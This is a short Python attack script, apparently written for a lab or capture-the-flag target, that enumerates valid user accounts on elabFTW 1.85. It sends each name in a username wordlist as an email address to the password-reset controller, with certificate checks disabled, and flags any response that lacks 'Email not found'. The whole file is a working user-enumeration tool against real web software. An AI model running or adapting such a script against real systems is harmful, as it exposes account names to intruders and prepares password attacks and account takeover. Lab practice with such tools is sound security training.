#!/usr/bin/python3

# elabFTW 1.85
import requests
import time

def main():

    port = '443'
    host = "source.pg"
    wordlist = '/usr/share/seclists/Usernames/top-usernames-shortlist.txt'
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    with open(wordlist, encoding = 'utf-8') as f:
        for username in f:
            username = username.strip().replace('\n','')
            sessionPost = requests.Session()
            sessionPost.verify=False
            url = 'https://' + host + ':' + port + '/app/controllers/ResetPasswordController.php'
            testEmail = f'{username}@{host}'
            print(f'Checking username {testEmail}')
            postdata ={'email': testEmail}
            r = sessionPost.post(url, data=postdata)
            if not 'Email not found' in r.text:
                 print(f"Found valid username: {username}")
                 break
            time.sleep(3)

if __name__ == "__main__":
    main()
